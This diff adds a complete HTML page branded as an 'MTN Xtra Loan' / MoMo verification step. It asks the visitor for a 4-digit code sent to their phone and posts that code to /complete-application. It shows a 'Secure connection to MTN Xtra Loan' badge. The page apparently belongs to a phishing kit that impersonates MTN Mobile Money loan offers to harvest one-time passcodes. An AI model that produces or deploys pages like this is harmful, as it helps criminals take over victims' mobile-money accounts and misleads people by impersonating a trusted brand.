@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Verification Code - MTN Advance Loans</title>
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #eef2f5; margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; }
+        
+        /* Top Header */
+        .top-header {
+            background-color: #000;
+            color: white;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo-area {
+            background-color: #004c6c;
+            padding: 5px 15px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo-area img { height: 30px; border-radius: 4px; }
+        .logo-area span { color: #ffcc00; font-weight: bold; font-size: 1.1rem; letter-spacing: 1px;}
+        
+        .header-title {
+            color: #ffcc00;
+            font-weight: bold;
+            font-size: 1.1rem;
+            letter-spacing: 1px;
+            flex-grow: 1;
+            margin-left: 20px;
+        }
+
+        .lang-btn {
+            background-color: #1a1a1a;
+            color: white;
+            border: 1px solid #444;
+            padding: 6px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        /* Main Content Container */
+        .container {
+            max-width: 500px;
+            margin: 20px auto;
+            background: white;
+            border-radius: 15px;
+            padding: 40px 25px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            text-align: center;
+            flex-grow: 1;
+        }
+
+        .icon-circle {
+            background-color: #fff9e6;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px auto;
+            font-size: 2.5rem;
+            box-shadow: 0 0 20px rgba(255, 204, 0, 0.2);
+        }
+
+        h2 { color: #001f3f; font-size: 1.8rem; margin-bottom: 15px; }
+        h2 span { color: #ffcc00; }
+        
+        p.subtitle {
+            color: #555;
+            font-size: 1rem;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        /* 4-Digit Input Boxes */
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .code-inputs input {
+            width: 65px;
+            height: 75px;
+            font-size: 2rem;
+            text-align: center;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            background-color: #fcfcfc;
+            outline: none;
+            color: #001f3f;
+            font-weight: bold;
+            transition: 0.2s;
+        }
+        
+        .code-inputs input:focus {
+            border-color: #ffcc00;
+            box-shadow: 0 0 10px rgba(255, 204, 0, 0.3);
+            background-color: #fff;
+        }
+
+        /* Action Button */
+        .verify-btn {
+            width: 100%;
+            padding: 18px;
+            background-color: #ffe680; /* Faded yellow */
+            color: #999;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            letter-spacing: 1px;
+            cursor: not-allowed;
+            transition: 0.3s;
+            margin-bottom: 20px;
+        }
+        .verify-btn.active {
+            background-color: #ffcc00;
+            color: #004c6c;
+            cursor: pointer;
+        }
+
+        .resend-row {
+            font-size: 0.95rem;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .resend-row strong { color: #001f3f; cursor: pointer; }
+
+        .secure-text {
+            font-size: 0.85rem;
+            color: #888;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 0.9rem;
+            color: #888;
+            padding: 20px;
+            background-color: #fff;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header class="top-header">
+        <div class="logo-area">
+            <img src="momo-preview.jpg" alt="MoMo">
+            <span>MTN XTRA LOAN</span>
+        </div>
+        <div class="lang-btn">🌐 English ▼</div>
+    </header>
+
+    <!-- MAIN CONTENT -->
+    <div class="container">
+        <div class="icon-circle">🔐</div>
+        
+        <h2>Enter the <span>Verification Code</span></h2>
+        <p class="subtitle">We sent a <strong>4-digit code</strong> to your number. Enter it below to continue.</p>
+
+        <form action="/complete-application" method="POST" id="codeForm">
+            <div class="code-inputs">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required oninput="moveToNext(this, 'digit2')" id="digit1" name="code1">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required oninput="moveToNext(this, 'digit3')" id="digit2" name="code2">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required oninput="moveToNext(this, 'digit4')" id="digit3" name="code3">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required oninput="moveToNext(this, null)" id="digit4" name="code4">
+            </div>
+
+            <button type="submit" id="verifyBtn" class="verify-btn" disabled>VERIFY & CONTINUE →</button>
+        </form>
+
+        <div class="resend-row">
+            Didn't receive the code? <strong>Resend code</strong>
+        </div>
+
+        <div class="secure-text">
+            🔒 Secure connection to MTN Xtra Loan
+        </div>
+    </div>
+
+    <div class="footer">
+        © 2026 MTN Xtra Loan
+    </div>
+
+    <script>
+        // Logic to handle input focus and button activation
+        const inputs = document.querySelectorAll('.code-inputs input');
+        const verifyBtn = document.getElementById('verifyBtn');
+
+        function moveToNext(currentInput, nextInputId) {
+            // Keep only numbers
+            currentInput.value = currentInput.value.replace(/[^0-9]/g, '');
+
+            if (currentInput.value !== '' && nextInputId) {
+                document.getElementById(nextInputId).focus();
+            }
+            checkInputs();
+        }
+
+        function checkInputs() {
+            let allFilled = true;
+            inputs.forEach(input => {
+                if (input.value === '') allFilled = false;
+            });
+
+            if (allFilled) {
+                verifyBtn.disabled = false;
+                verifyBtn.classList.add('active');
+            } else {
+                verifyBtn.disabled = true;
+                verifyBtn.classList.remove('active');
+            }
+        }
+
+        // Handle backspace to go to previous input
+        inputs.forEach((input, index) => {
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
